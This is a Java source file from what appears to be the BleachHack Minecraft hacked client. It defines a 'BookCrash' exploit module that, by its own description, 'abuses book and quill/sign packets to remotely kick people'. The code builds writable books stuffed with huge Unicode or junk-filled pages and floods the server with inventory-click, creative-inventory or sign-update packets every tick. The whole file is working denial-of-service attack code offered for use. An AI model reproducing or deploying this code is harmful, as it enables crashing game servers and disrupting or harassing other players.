/*
 * This file is part of the BleachHack distribution (https://github.com/BleachDrinker420/BleachHack/).
 * Copyright (c) 2019 Bleach.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package bleach.hack.module.mods;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

import com.google.common.eventbus.Subscribe;

import bleach.hack.event.events.EventReadPacket;
import bleach.hack.event.events.EventTick;
import bleach.hack.module.Category;
import bleach.hack.module.Module;
import bleach.hack.setting.base.SettingMode;
import bleach.hack.setting.base.SettingSlider;
import bleach.hack.setting.base.SettingToggle;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.math.BlockPos;

/* Rebranded queueskip exploit. credit > https://www.youtube.com/watch?v=-BA4ABlFJuc */
public class BookCrash extends Module {

	private int delay = 0;

	public BookCrash() {
		super("BookCrash", KEY_UNBOUND, Category.EXPLOITS, "Abuses book and quill/sign packets to remotely kick people.",
				new SettingMode("Mode", "Jessica", "Raion", "Sign").withDesc("What method to use"),
				new SettingSlider("Uses", 1, 20, 5, 0).withDesc("How many uses per tick"),
				new SettingSlider("Delay", 0, 5, 0, 0).withDesc("How many ticks to wait between uses"),
				new SettingMode("Fill", "Ascii", "0xFFFF", "Random", "Old").withDesc("How to fill the book"),
				new SettingSlider("Pages", 1, 100, 50, 0).withDesc("How many pages to fill"),
				new SettingToggle("Auto-Off", true).withDesc("Automatically turns the modules off when you disconnect"));
	}

	@Subscribe
	public void onTick(EventTick event) {
		delay = (delay >= getSetting(2).asSlider().getValue() ? 0 : delay + 1);
		if (delay > 0)
			return;

		ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
		ListTag list = new ListTag();
		CompoundTag tag = new CompoundTag();
		String author = "Bleach";
		String title = "\n Bleachhack Owns All \n";

		String size = "";
		int pages = Math.min((int) getSetting(4).asSlider().getValue(), 100);
		int pageChars = 210;

		if (getSetting(3).asMode().mode == 2) {
			IntStream chars = new Random().ints(0x80, 0x10FFFF - 0x800).map(i -> i < 0xd800 ? i : i + 0x800);
			size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
		} else if (getSetting(3).asMode().mode == 1) {
			size = repeat(pages * pageChars, String.valueOf(0x10FFFF));
		} else if (getSetting(3).asMode().mode == 0) {
			IntStream chars = new Random().ints(0x20, 0x7E);
			size = chars.limit(pageChars * pages).mapToObj(i -> String.valueOf((char) i)).collect(Collectors.joining());
		} else if (getSetting(3).asMode().mode == 3) {
			size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
		}

		if (getSetting(0).asMode().mode == 2) {
			String text = "bh ontop";
			Random rand = new Random();
			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
				mc.player.networkHandler.sendPacket(new UpdateSignC2SPacket(
						new BlockPos(rand.nextInt(29999999), rand.nextInt(29999999), rand.nextInt(29999999)), text, text, text, text));
			}
		} else {
			for (int i = 0; i < pages; i++) {
				String siteContent = size;
				StringTag tString = StringTag.of(siteContent);
				list.add(tString);
			}

			tag.putString("author", author);
			tag.putString("title", title);
			tag.put("pages", list);

			bookObj.putSubTag("pages", list);
			bookObj.setTag(tag);

			for (int i = 0; i < getSetting(1).asSlider().getValue(); i++) {
				if (getSetting(0).asMode().mode == 0) {
					mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, SlotActionType.PICKUP, bookObj, (short) 0));
				} else {
					mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(0, bookObj));
				}
			}
		}
	}

	private static String repeat(int count, String with) {
		return new String(new char[count]).replace("\0", with);
	}

	@Subscribe
	private void EventDisconnect(EventReadPacket event) {
		if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(5).asToggle().state)
			setEnabled(false);
	}
}
